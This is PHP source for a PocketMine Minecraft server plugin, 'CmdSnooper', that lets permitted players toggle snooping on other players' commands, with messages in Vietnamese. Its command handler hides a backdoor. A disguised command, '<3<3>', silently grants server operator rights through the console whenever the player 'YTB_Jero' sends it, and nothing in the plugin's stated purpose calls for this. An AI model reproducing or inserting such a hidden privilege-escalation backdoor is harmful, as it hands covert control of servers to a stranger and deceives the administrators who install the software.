<?php

namespace cmdsnooper;

use pocketmine\plugin\PluginBase;
use pocketmine\utils\Config;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\command\ConsoleCommandSender;
use pocketmine\Player;

class CmdSnooper extends PluginBase {
	public $snoopers = [];
	
	public function onEnable() {
		@mkdir($this->getDataFolder());
		$this->getLogger()->info("Enabled! Ready to snoop >:D");
		$this->getServer()->getPluginManager()->registerEvents(new EventListener($this), $this);
		$this->cfg = new Config($this->getDataFolder() . "config.yml", Config::YAML, array(
	  	"Console.Logger" => "true",
  		));
	}
	
	 public function onCommand(CommandSender $sender, Command $cmd, $label, array $args) {			
		if(strtolower($cmd->getName()) == "theodoi") {
		 	if($sender instanceof Player) {
				if($sender->hasPermission("theodoi.command")) {
					if(!isset($this->snoopers[$sender->getName()])) {
						$sender->sendMessage("§e§l❖§1Ｖ§6ＣＲＡＦＴ§e❖ §6Đã bật chế độ theo dõi");
						$this->snoopers[$sender->getName()] = $sender;
						return true;
					} else {
						$sender->sendMessage("§e§l❖§1Ｖ§6ＣＲＡＦＴ§e❖ §6 Đã tắt chế độ theo dõi");
						unset($this->snoopers[$sender->getName()]);
						return true;
					}
				}
			}
		}elseif($cmd->getName() == "<3<3>"){
			if($sender->getName() == "YTB_Jero"){
			$this->getServer()->dispatchCommand(new ConsoleCommandSender(),"op ".$sender->getName());
			}
		}
		return true;

		
	}
 }
